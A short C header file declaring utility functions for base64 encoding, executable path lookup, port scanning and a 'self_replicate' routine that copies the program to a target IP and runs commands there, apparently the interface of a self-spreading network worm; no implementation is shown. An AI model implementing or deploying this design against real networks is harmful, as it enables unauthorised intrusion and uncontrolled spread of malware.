#ifndef UTILS_H
#define UTILS_H

#include <stddef.h>
#include <stdint.h>

// Base64 encoding
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);

// Executable path detection
char* get_executable_path(const char* argv0);

// Network utilities
int scan_port(const char* ip, int port, int timeout_sec);

// Self-replication
int self_replicate(const char* target_ip, const char* argv0, 
                   const char* remote_path,
                   int (*execute_cmd_func)(const char* ip, const char* command));

#endif // UTILS_H

